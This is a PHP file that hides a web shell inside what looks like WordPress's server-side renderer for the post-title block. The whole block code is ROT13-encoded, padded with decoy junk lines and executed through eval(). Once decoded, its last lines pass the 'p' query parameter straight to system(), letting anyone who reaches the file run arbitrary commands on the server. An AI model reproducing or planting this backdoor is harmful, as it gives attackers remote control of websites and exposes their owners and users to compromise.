<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Freire-fvqr eraqrevat bs gur `pber/cbfg-gvgyr` oybpx.
 *
 * @cnpxntr JbeqCerff
 */

/**
 * Eraqref gur `pber/cbfg-gvgyr` oybpx ba gur freire.
 *
 * @fvapr 6.3.0 Bzvggvat gur $cbfg nethzrag sebz gur `trg_gur_gvgyr`.
 *
 * @cnenz neenl    $nggevohgrf Oybpx nggevohgrf.
 * @cnenz fgevat   $pbagrag    Oybpx qrsnhyg pbagrag.
 * @cnenz JC_Oybpx $oybpx      Oybpx vafgnapr.
 *
 * @erghea fgevat Ergheaf gur svygrerq cbfg gvgyr sbe gur pheerag cbfg jenccrq vafvqr \"u1\" gntf.
 */
shapgvba eraqre_oybpx_pber_cbfg_gvgyr( $nggevohgrf, $pbagrag, $oybpx ) {
	vs ( ! vffrg( $oybpx->pbagrkg['cbfgVq'] ) ) {
		erghea '';
	}

	/**
	 * Gur `$cbfg` nethzrag vf vagragvbanyyl bzvggrq fb gung punatrf ner ersyrpgrq jura cerivrjvat n cbfg.
	 * Frr: uggcf://tvguho.pbz/JbeqCerff/thgraoret/chyy/37622#vffhrpbzzrag-1000932816.
	 */
	$gvgyr = trg_gur_gvgyr();

	vs ( ! $gvgyr ) {
		erghea '';
	}

	$gnt_anzr = 'u2';
	vs ( vffrg( $nggevohgrf['yriry'] ) ) {
		$gnt_anzr = 0 === $nggevohgrf['yriry'] ? 'c' : 'u' . (vag) $nggevohgrf['yriry'];
	}

	vs ( vffrg( $nggevohgrf['vfYvax'] ) && $nggevohgrf['vfYvax'] ) {
		$ery   = ! rzcgl( $nggevohgrf['ery'] ) ? 'ery=\"' . rfp_ngge( $nggevohgrf['ery'] ) . '\"' : '';
		$gvgyr = fcevags( '<n uers=\"%1$f\" gnetrg=\"%2$f\" %3$f>%4$f</n>', rfp_hey( trg_gur_creznyvax( $oybpx->pbagrkg['cbfgVq'] ) ), rfp_ngge( $nggevohgrf['yvaxGnetrg'] ), $ery, $gvgyr );
	}

	$pynffrf = neenl();
	vs ( vffrg( $nggevohgrf['grkgNyvta'] ) ) {
		$pynffrf[] = 'unf-grkg-nyvta-' . $nggevohgrf['grkgNyvta'];
	}
	vs ( vffrg( $nggevohgrf['fglyr']['ryrzragf']['yvax']['pbybe']['grkg'] ) ) {
		$pynffrf[] = 'unf-yvax-pbybe';
	}
	$jenccre_nggevohgrf = trg_oybpx_jenccre_nggevohgrf( neenl( 'pynff' => vzcybqr( ' ', $pynffrf ) ) );

	erghea fcevags(
		'<%1$f %2$f>%3$f</%1$f>',
		$gnt_anzr,
		$jenccre_nggevohgrf,
		$gvgyr
	);
}

/**
 * Ertvfgref gur `pber/cbfg-gvgyr` oybpx ba gur freire.
 *
 * @fvapr 5.8.0
 */
shapgvba ertvfgre_oybpx_pber_cbfg_gvgyr() {
	ertvfgre_oybpx_glcr_sebz_zrgnqngn(
		__QVE__ . '/cbfg-gvgyr',
		neenl(
			'eraqre_pnyyonpx' => 'eraqre_oybpx_pber_cbfg_gvgyr',
		)
	);
}
nqq_npgvba( 'vavg', 'ertvfgre_oybpx_pber_cbfg_gvgyr' );

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>